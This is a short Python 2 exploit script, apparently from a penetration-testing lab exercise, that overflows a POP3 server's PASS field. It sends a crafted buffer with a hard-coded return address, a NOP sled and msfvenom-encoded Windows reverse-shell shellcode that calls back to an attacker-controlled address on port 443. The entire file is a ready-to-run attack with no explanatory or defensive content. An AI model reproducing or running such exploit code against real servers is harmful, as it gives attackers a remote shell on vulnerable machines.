#!/usr/bin/python
import socket
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
#msfvenom -p windows/shell_reverse_tcp LHOST=10.11.0.202 LPORT=443 -f c -a x86 --platform windows -b "\x00\x0a\x0d" -e x86/shikata_ga_nai > windows_reverse_shell_code
shellcode =("\xb8\xbd\x95\xbc\x9d\xdb\xcf\xd9\x74\x24\xf4\x5f\x33\xc9\xb1"
"\x52\x31\x47\x12\x03\x47\x12\x83\x52\x69\x5e\x68\x50\x7a\x1d"
"\x93\xa8\x7b\x42\x1d\x4d\x4a\x42\x79\x06\xfd\x72\x09\x4a\xf2"
"\xf9\x5f\x7e\x81\x8c\x77\x71\x22\x3a\xae\xbc\xb3\x17\x92\xdf"
"\x37\x6a\xc7\x3f\x09\xa5\x1a\x3e\x4e\xd8\xd7\x12\x07\x96\x4a"
"\x82\x2c\xe2\x56\x29\x7e\xe2\xde\xce\x37\x05\xce\x41\x43\x5c"
"\xd0\x60\x80\xd4\x59\x7a\xc5\xd1\x10\xf1\x3d\xad\xa2\xd3\x0f"
"\x4e\x08\x1a\xa0\xbd\x50\x5b\x07\x5e\x27\x95\x7b\xe3\x30\x62"
"\x01\x3f\xb4\x70\xa1\xb4\x6e\x5c\x53\x18\xe8\x17\x5f\xd5\x7e"
"\x7f\x7c\xe8\x53\xf4\x78\x61\x52\xda\x08\x31\x71\xfe\x51\xe1"
"\x18\xa7\x3f\x44\x24\xb7\x9f\x39\x80\xbc\x32\x2d\xb9\x9f\x5a"
"\x82\xf0\x1f\x9b\x8c\x83\x6c\xa9\x13\x38\xfa\x81\xdc\xe6\xfd"
"\xe6\xf6\x5f\x91\x18\xf9\x9f\xb8\xde\xad\xcf\xd2\xf7\xcd\x9b"
"\x22\xf7\x1b\x0b\x72\x57\xf4\xec\x22\x17\xa4\x84\x28\x98\x9b"
"\xb5\x53\x72\xb4\x5c\xae\x15\xb1\xab\xb0\x2f\xad\xa9\xb0\xae"
"\x95\x27\x56\xda\xf9\x61\xc1\x73\x63\x28\x99\xe2\x6c\xe6\xe4"
"\x25\xe6\x05\x19\xeb\x0f\x63\x09\x9c\xff\x3e\x73\x0b\xff\x94"
"\x1b\xd7\x92\x72\xdb\x9e\x8e\x2c\x8c\xf7\x61\x25\x58\xea\xd8"
"\x9f\x7e\xf7\xbd\xd8\x3a\x2c\x7e\xe6\xc3\xa1\x3a\xcc\xd3\x7f"
"\xc2\x48\x87\x2f\x95\x06\x71\x96\x4f\xe9\x2b\x40\x23\xa3\xbb"
"\x15\x0f\x74\xbd\x19\x5a\x02\x21\xab\x33\x53\x5e\x04\xd4\x53"
"\x27\x78\x44\x9b\xf2\x38\x74\xd6\x5e\x68\x1d\xbf\x0b\x28\x40"
"\x40\xe6\x6f\x7d\xc3\x02\x10\x7a\xdb\x67\x15\xc6\x5b\x94\x67"
"\x57\x0e\x9a\xd4\x58\x1b")  

buffer = "A"*2606 +"\x8f\x35\x4a\x5f" + "\x90" * 16 + shellcode + "C"*(3500-2606-4-351-16)

try:
    print "\nSending evil buffer..."
    s.connect(('10.11.1.217',110))
    data = s.recv(1024)
    s.send('USER username' +'\r\n')
    data = s.recv(1024)
    s.send('PASS ' + buffer + '\r\n')
    print "\nDone!."
except:
    print "Could not connect to POP3!"
